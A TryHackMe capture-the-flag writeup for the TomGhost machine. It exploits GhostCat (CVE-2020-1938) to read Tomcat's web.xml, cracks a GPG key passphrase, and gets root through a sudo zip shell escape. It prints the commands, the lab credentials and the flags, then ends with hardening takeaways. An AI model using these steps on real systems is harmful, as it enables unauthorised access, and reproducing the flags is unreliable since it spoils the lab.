# 👻 TomGhost: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)
[![CVE](https://img.shields.io/badge/CVE-2020--1938-orange?style=for-the-badge)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `tomghost.thm` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | GhostCat (CVE-2020-1938) — unauthenticated AJP file read → `web.xml` credential leak |
| **Privesc** | GPG key passphrase crack → decrypt credential file → SSH as `merlin` → `sudo zip` GTFOBins |

TomGhost exploits GhostCat, a critical Apache Tomcat vulnerability affecting the AJP connector. The exposed port 8009 allows unauthenticated file reads from the web application root — `web.xml` leaks SSH credentials for `skyfuck`. On the box, a PGP-encrypted credential file and matching private key are present; cracking the key passphrase with `gpg2john` + `john` decrypts credentials for `merlin`. `merlin` can run `zip` as root via sudo — a standard GTFOBins escape.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 tomghost.thm -oA tomghost-tcp-scan
sudo nmap -sU -sC -sV -vv tomghost.thm -oA tomghost-udp-scan
```

```
22/tcp   open  ssh       OpenSSH 7.2p2
8080/tcp open  http      Apache Tomcat 9.0.30
8009/tcp open  ajp13     Apache Jserv Protocol v1.3  ← GhostCat attack surface
```

Port 8009 is the AJP connector. Tomcat versions before 9.0.31 / 8.5.51 / 7.0.100 are vulnerable to CVE-2020-1938.

---

## 💀 Initial Access — GhostCat (CVE-2020-1938)

The AJP connector was designed for internal load balancer communication. When exposed with no authentication, it allows reading any file under the webapp root — including config files that often contain credentials.

```bash
python3 exploit.py http://tomghost.thm 8009 /WEB-INF/web.xml read
```

```xml
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

```bash
ssh skyfuck@tomghost.thm
# password: 8730281lkjlkjdqlksalks
```

### User Flag

```bash
cat user.txt
# THM{GhostCat_1s_so_cr4sy}
```

---

## 🔁 Privilege Escalation — skyfuck → merlin

### GPG Key Cracking

`skyfuck`'s home directory contains two files:

```
credential.pgp   ← PGP-encrypted credential file
tryhackme.asc    ← Armored GPG private key (passphrase-protected)
```

```bash
# Extract hash from private key
gpg2john tryhackme.asc > hash.txt

# Crack passphrase
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# alexandru    (tryhackme)
```

```bash
# Import key and decrypt credentials
gpg --import tryhackme.asc   # passphrase: alexandru
gpg --decrypt credential.pgp
# merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```bash
ssh merlin@tomghost.thm
```

---

## 🔁 Privilege Escalation — merlin → root

### sudo Enumeration

```bash
sudo -l
```

```
(root : root) NOPASSWD: /usr/bin/zip
```

### zip GTFOBins

`zip`'s `-T` flag runs an integrity test command after archiving. The `-TT` flag lets you override the test command. The `#` comments out any trailing arguments zip appends — leaving a clean shell spawn:

```bash
sudo /usr/bin/zip hello.zip /etc/hosts -T -TT '/bin/sh #'
```

```
# whoami
root
```

### Root Flag

```bash
cat /root/root.txt
# THM{Z1P_1S_FAKE}
```

---

## 🗺️ Attack Chain

```
[Tomcat AJP — port 8009]
    CVE-2020-1938 GhostCat → /WEB-INF/web.xml read
    skyfuck:8730281lkjlkjdqlksalks → SSH
          │
          ▼
[GPG Key + Encrypted Credential]
    gpg2john → john → passphrase: alexandru
    gpg decrypt → merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
    SSH as merlin
          │
          ▼
[sudo zip GTFOBins]
    zip -T -TT '/bin/sh #' → root shell → root.txt
```

---

## 📌 Key Takeaways

- The AJP connector (8009) should never be exposed to untrusted networks; it's an internal protocol for reverse proxy communication only — firewall it or disable it entirely if not in use
- Credentials in `web.xml` are a recurring real-world finding in Tomcat deployments; secrets should be injected via environment variables or a secrets manager, not hardcoded in config files
- Storing a PGP-encrypted credential file alongside its private key on the same host defeats the purpose of encryption — the key is the secret, and it needs to be kept separately
- `sudo zip` is a direct GTFOBins root; any unrestricted sudo binary should be cross-referenced against GTFOBins before deployment
